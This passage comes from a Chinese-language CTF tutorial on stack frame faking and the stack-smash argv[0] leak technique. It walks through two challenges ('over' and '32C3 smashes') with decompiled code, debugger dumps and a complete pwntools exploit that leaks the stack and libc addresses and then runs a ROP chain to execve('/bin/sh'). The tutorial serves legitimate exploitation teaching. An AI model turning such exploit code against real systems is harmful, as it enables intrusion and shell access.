\u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236 EBP \u4e0e EIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176 payload \u5982\u4e0b buffer padding|fake ebp|leave ret addr| \u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8bb2\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206 \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884c leave ret \u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684 leave ret \u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21 leave ret\u3002 \u5176\u4e2d fake ebp \u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b fake ebp | v ebp2|target function addr|leave ret addr|arg1|arg2 \u8fd9\u91cc\u6211\u4eec\u7684 fake ebp \u6307\u5411 ebp2\uff0c\u5373\u5b83\u4e3a ebp2 \u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u7684\u6c47\u7f16\u8bed\u6cd5\u662f AT&T \u8bed\u6cd5\u3002 \u5728\u6211\u4eec\u4ecb\u7ecd\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u6709\u5fc5\u8981\u8bf4\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u5165\u53e3\u70b9\u4e0e\u51fa\u53e3\u70b9\u7684\u57fa\u672c\u64cd\u4f5c \u5165\u53e3\u70b9 push ebp # \u5c06ebp\u538b\u6808 move esp, ebp #\u5c06esp\u7684\u503c\u8d4b\u7ed9ebp \u51fa\u53e3\u70b9 leave ret #pop eip\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20\u4f5c\u4e3a\u7a0b\u5e8f\u4e0b\u4e00\u4e2a\u6267\u884c\u5730\u5740 \u5176\u4e2d leave \u6307\u4ee4\u76f8\u5f53\u4e8e move ebp, esp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp pop ebp #\u5f39\u51faebp \u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u3002 \u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884c leave \u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 move ebp, esp \uff0c\u8fd9\u4f1a\u5c06 esp \u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684 ebp \u57fa\u5730\u5740\u5904\u3002 pop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684 fake ebp \u7684\u503c\u8d4b\u7ed9 ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp\u4fbf\u6307\u5411\u4e86ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86 ebp2 \u6240\u5728\u7684\u5730\u5740\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884c leave ret \u6307\u4ee4\u3002 \u6267\u884c leave \u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4 move ebp, esp \uff0c\u8fd9\u4f1a\u5c06 esp \u6307\u5411 ebp2\u3002 pop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06 ebp \u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3a ebp2 \u7684\u503c\uff0c\u540c\u65f6 esp \u4f1a\u6307\u5411 target function\u3002 \u6267\u884c ret \u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c target function\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c push ebp\uff0c\u4f1a\u5c06 ebp2 \u503c\u538b\u5165\u6808\u4e2d\uff0c move esp, ebp\uff0c\u5c06 ebp \u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002 \u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b ebp | v ebp2|leave ret addr|arg1|arg2 \u5f53\u7a0b\u5e8f\u6267\u884c\u5e08\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002 \u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728 ebp2 \u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u53ef\u4ee5\u770b\u51fa\u5728 fake frame \u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0e stack pivoting \u76f8\u4f3c\u3002 \u4f8b\u5b50 \u00b6 \u4ee5 2018 \u5e74 6 \u6708\u5b89\u6052\u676f\u6708\u8d5b\u7684 over \u4e00\u9898\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd, \u9898\u76ee\u53ef\u4ee5\u5728 ctf-challenge \u4e2d\u627e\u5230 \u6587\u4ef6\u4fe1\u606f \u00b6 over.over: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 99beb778a74c68e4ce1477b559391e860dd0e946, stripped [ * ] '/home/m4x/pwn_repo/others_over/over.over' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f, \u6ca1\u6709\u5f00 PIE \u548c canary \u4fdd\u62a4, \u4f46\u5f00\u4e86 NX \u4fdd\u62a4 \u5206\u6790\u7a0b\u5e8f \u00b6 \u653e\u5230 IDA \u4e2d\u8fdb\u884c\u5206\u6790 __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { setvbuf ( stdin , 0LL , 2 , 0LL ); setvbuf ( stdout , 0LL , 2 , 0LL ); while ( sub_400676 () ) ; return 0LL ; } int sub_400676 () { char buf [ 80 ]; // [rsp+0h] [rbp-50h] memset ( buf , 0 , sizeof ( buf )); putchar ( '>' ); read ( 0 , buf , 96uLL ); return puts ( buf ); } \u6f0f\u6d1e\u5f88\u660e\u663e, read \u80fd\u8bfb\u5165 96 \u4f4d, \u4f46 buf \u7684\u957f\u5ea6\u53ea\u6709 80, \u56e0\u6b64\u80fd\u8986\u76d6 rbp \u4ee5\u53ca ret addr \u4f46\u4e5f\u53ea\u80fd\u8986\u76d6\u5230 rbp \u548c ret addr, \u56e0\u6b64\u4e5f\u53ea\u80fd\u901a\u8fc7\u540c\u65f6\u63a7\u5236 rbp \u4ee5\u53ca ret addr \u6765\u8fdb\u884c rop \u4e86 leak stack \u00b6 \u4e3a\u4e86\u63a7\u5236 rbp, \u6211\u4eec\u9700\u8981\u77e5\u9053\u67d0\u4e9b\u5730\u5740, \u53ef\u4ee5\u53d1\u73b0\u5f53\u8f93\u5165\u7684\u957f\u5ea6\u4e3a 80 \u65f6, \u7531\u4e8e read \u5e76\u4e0d\u4f1a\u7ed9\u8f93\u5165\u672b\u5c3e\u8865\u4e0a '\\0', rbp \u7684\u503c\u5c31\u4f1a\u88ab puts \u6253\u5370\u51fa\u6765, \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u56fa\u5b9a\u504f\u79fb\u77e5\u9053\u6808\u4e0a\u6240\u6709\u4f4d\u7f6e\u7684\u5730\u5740\u4e86 Breakpoint 1 , 0x00000000004006b9 in ?? () LEGEND : STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RBX 0x0 RCX 0x7ff756e9b690 ( __read_nocancel + 7 ) \u25c2\u2014 cmp rax , - 0xfff RDX 0x60 RDI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RSI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) R8 0x7ff75715b760 ( _IO_stdfile_1_lock ) \u25c2\u2014 0x0 R9 0x7ff757354700 \u25c2\u2014 0x7ff757354700 R10 0x37b R11 0x246 R12 0x400580 \u25c2\u2014 xor ebp , ebp R13 0x7ffceaf112b0 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 RSP 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RIP 0x4006b9 \u25c2\u2014 call 0x400530 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x4006b9 call puts @ plt < 0x400530 > s : 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) 0x4006be leave 0x4006bf ret 0x4006c0 push rbp 0x4006c1 mov rbp , rsp 0x4006c4 sub rsp , 0x10 0x4006c8 mov dword ptr [ rbp - 4 ], edi 0x4006cb mov qword ptr [ rbp - 0x10 ], rsi 0x4006cf mov rax , qword ptr [ rip + 0x20098a ] < 0x601060 > 0x4006d6 mov ecx , 0 0x4006db mov edx , 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ BACKTRACE ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba f 0 4006 b9 f 1 400715 f 2 7ff 756 de02b1 __libc_start_main + 241 Breakpoint * 0x4006B9 pwndbg > stack 15 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 0 a : 0050 \u2502 rbp 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 0 b : 005 8 \u2502 0x7ffceaf111b8 \u2014\u25b8 0x400715 \u25c2\u2014 test eax , eax 0 c : 0060 \u2502 0x7ffceaf111c0 \u2014\u25b8 0x7ffceaf112b8 \u2014\u25b8 0x7ffceaf133db \u25c2\u2014 ' . / over . over ' 0 d : 006 8 \u2502 0x7ffceaf111c8 \u25c2\u2014 0x100000000 0 e : 0070 \u2502 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 pwndbg > distance 0x7ffceaf111d0 0x7ffceaf11160 0x7ffceaf111d0 -> 0x7ffceaf11160 is - 0x70 bytes ( - 0xe words ) leak \u51fa\u6808\u5730\u5740\u540e, \u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 rbp \u4e3a\u6808\u4e0a\u7684\u5730\u5740(\u5982 0x7ffceaf11160), ret addr \u4e3a leave ret \u7684\u5730\u5740\u6765\u5b9e\u73b0\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u4e86, \u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u5728 0x7ffceaf11160 + 0x8 \u586b\u4e0a leak libc \u7684 rop chain \u5e76\u63a7\u5236\u5176\u8fd4\u56de\u5230 sub_400676 \u51fd\u6570\u6765 leak libc, \u7136\u540e\u5728\u4e0b\u4e00\u6b21\u5229\u7528\u65f6\u5c31\u53ef\u4ee5\u901a\u8fc7 rop \u6267\u884c system(\"/bin/sh\") \u6216 execve(\"/bin/sh\", 0, 0)\u6765 get shell \u4e86, \u8fd9\u9053\u9898\u76ee\u56e0\u4e3a\u8f93\u5165\u7684\u957f\u5ea6\u8db3\u591f, \u6211\u4eec\u53ef\u4ee5\u5e03\u7f6e\u8c03\u7528 execve(\"/bin/sh\", 0, 0) \u7684\u5229\u7528\u94fe, \u8fd9\u79cd\u65b9\u6cd5\u66f4\u7a33\u59a5(system(\"/bin/sh\") \u53ef\u80fd\u4f1a\u56e0\u4e3a env \u88ab\u7834\u574f\u800c\u5931\u6548), \u4e0d\u8fc7\u7531\u4e8e\u5229\u7528\u8fc7\u7a0b\u4e2d\u6808\u7684\u7ed3\u6784\u4f1a\u53d1\u751f\u53d8\u5316, \u6240\u4ee5\u4e00\u4e9b\u5173\u952e\u7684\u504f\u79fb\u8fd8\u9700\u8981\u901a\u8fc7\u591a\u6b21\u8c03\u8bd5\u6765\u786e\u5b9a exp \u00b6 from pwn import * context . binary = \"./over.over\" def DEBUG ( cmd ): raw_input ( \"DEBUG: \" ) gdb . attach ( io , cmd ) io = process ( \"./over.over\" ) elf = ELF ( \"./over.over\" ) libc = elf . libc io . sendafter ( \">\" , 'a' * 80 ) stack = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 success ( \"stack -> {:#x}\" . format ( stack )) # DEBUG(\"b *0x4006B9\\nc\") io . sendafter ( \">\" , flat ([ '11111111' , 0x400793 , elf . got [ 'puts' ], elf . plt [ 'puts' ], 0x400676 , ( 80 - 40 ) * '1' , stack , 0x4006be ])) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] success ( \"libc.address -> {:#x}\" . format ( libc . address )) pop_rdi_ret = 0x400793 ''' $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \"pop|ret\" 0x00000000000f5279 : pop rdx ; pop rsi ; ret ''' pop_rdx_pop_rsi_ret = libc . address + 0xf5279 payload = flat ([ '22222222' , pop_rdi_ret , next ( libc . search ( \"/bin/sh\" )), pop_rdx_pop_rsi_ret , p64 ( 0 ), p64 ( 0 ), libc . sym [ 'execve' ], ( 80 - 7 * 8 ) * '2' , stack - 0x30 , 0x4006be ]) io . sendafter ( \">\" , payload ) io . interactive () \u603b\u7684\u6765\u8bf4\u8fd9\u79cd\u65b9\u6cd5\u8ddf stack pivot \u5dee\u522b\u5e76\u4e0d\u662f\u5f88\u5927 \u53c2\u8003\u9605\u8bfb \u00b6 http://www.xfocus.net/articles/200602/851.html http://phrack.org/issues/58/4.html Stack smash \u00b6 \u539f\u7406 \u00b6 \u5728\u7a0b\u5e8f\u52a0\u4e86canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684 buffer \u8986\u76d6\u4e86\u5bf9\u5e94\u7684\u503c\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u800c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u5e76\u4e0d\u4f1a\u5173\u5fc3\u62a5\u9519\u4fe1\u606f\u3002\u800c stack smash \u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u542f\u52a8 canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0 canary \u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c __stack_chk_fail \u51fd\u6570\u6765\u6253\u5370 argv[0] \u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b void __attribute__ (( noreturn )) __stack_chk_fail ( void ) { __fortify_fail ( \"stack smashing detected\" ); } void __attribute__ (( noreturn )) internal_function __fortify_fail ( const char * msg ) { /* The loop is added only to keep gcc happy. */ while ( 1 ) __libc_message ( 2 , \"*** %s ***: %s terminated \\n \" , msg , __libc_argv [ 0 ] ?: \"<unknown>\" ); } \u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6 argv[0] \u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728 __fortify_fail \u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2015 \u5e74 32C3 CTF smashes \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8be5\u9898\u76ee\u5728 jarvisoj \u4e0a\u6709\u590d\u73b0\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a 64 \u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4ee5\u53ca NX \u4fdd\u62a4\uff0c\u4ee5\u53ca FORTIFY \u4fdd\u62a4\u3002 \u279c stacksmashes git: ( master ) \u2717 checksec smashes Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled \u5206\u6790\u7a0b\u5e8f \u00b6 ida \u770b\u4e00\u4e0b __int64 sub_4007E0 () { __int64 v0 ; // rax@1 __int64 v1 ; // rbx@2 int v2 ; // eax@3 __int64 v4 ; // [sp+0h] [bp-128h]@1 __int64 v5 ; // [sp+108h] [bp-20h]@1 v5 = * MK_FP ( __FS__ , 40LL ); __printf_chk ( 1LL , ( __int64 ) \"Hello! \\n What's your name? \" ); LODWORD ( v0 ) = _IO_gets (( __int64 ) & v4 ); if ( ! v0 ) LABEL_9 : _exit ( 1 ); v1 = 0LL ; __printf_chk ( 1LL , ( __int64 ) \"Nice to meet you, %s. \\n Please overwrite the flag: \" ); while ( 1 ) { v2 = _IO_getc ( stdin ); if ( v2 == - 1 ) goto LABEL_9 ; if ( v2 == '\\n' ) break ; byte_600D20 [ v1 ++ ] = v2 ; if ( v1 == ' ' ) goto LABEL_8 ; } memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); LABEL_8 : puts ( \"Thank you, bye!\" ); return * MK_FP ( __FS__ , 40LL ) ^ v5 ; } \u5f88\u663e\u7136\uff0c\u7a0b\u5e8f\u5728 _IO_gets((__int64)&v4); \u5b58\u5728\u6808\u6ea2\u51fa\u3002 \u6b64\u5916\uff0c\u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981 overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728 while \u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5 memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); \u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684flag\u5c31\u5728\u8fd9\u91cc\u554a\u3002 .data:0000000000600D20 ; char aPctfHereSTheFl[] .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0 \u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9 byte_600D20[v1++] = v2; \u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86 \u5728 ELF \u5185\u5b58\u6620\u5c04\u65f6\uff0cbss \u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u7684 find\u6765\u8fdb\u884c\u67e5\u627e\u3002 \u786e\u5b9a flag \u5730\u5740 \u00b6 \u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7d memset \u51fd\u6570\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b gef \u27a4 c Continuing. Hello ! What ' s your name ? qqqqqqq Nice to meet you , qqqqqqq. Please overwrite the flag : 222222222 Breakpoint 1 , __memset_avx2 () at .. / sysdeps / x86_64 / multiarch / memset-avx2.S : 38 38 .. / sysdeps / x86_64 / multiarch / memset-avx2.S : \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55 . \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386: x86-64 ] \u2500\u2500\u2500\u2500 0 x7ffff7b7f920 < __memset_chk_avx2 + 0 > cmp rcx , rdx 0 x7ffff7b7f923 < __memset_chk_avx2 + 3 > jb 0x7ffff7b24110 < __GI___chk_fail > 0 x7ffff7b7f929 nop DWORD PTR [ rax + 0x0 ] \u2192 0 x7ffff7b7f930 < __memset_avx2 + 0 > vpxor xmm0 , xmm0 , xmm0 0 x7ffff7b7f934 < __memset_avx2 + 4 > vmovd xmm1 , esi 0 x7ffff7b7f938 < __memset_avx2 + 8 > lea rsi , [ rdi + rdx * 1 ] 0 x7ffff7b7f93c < __memset_avx2 + 12 > mov rax , rdi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 x7fffffffda38 ' , ' l8 ' ] 8 0 x00007fffffffda38 \u2502+ 0x00 : 0x0000000000400878 \u2192 mov edi , 0x40094e \u2190 $rsp 0 x00007fffffffda40 \u2502+ 0x08 : 0x0071717171717171 ( \" qqqqqqq \"? ) 0 x00007fffffffda48 \u2502+ 0x10 : 0x0000000000000000 0 x00007fffffffda50 \u2502+ 0x18 : 0x0000000000000000 0 x00007fffffffda58 \u2502+ 0x20 : 0x0000000000000000 0 x00007fffffffda60 \u2502+ 0x28 : 0x0000000000000000 0 x00007fffffffda68 \u2502+ 0x30 : 0x0000000000000000 0 x00007fffffffda70 \u2502+ 0x38 : 0x0000000000000000 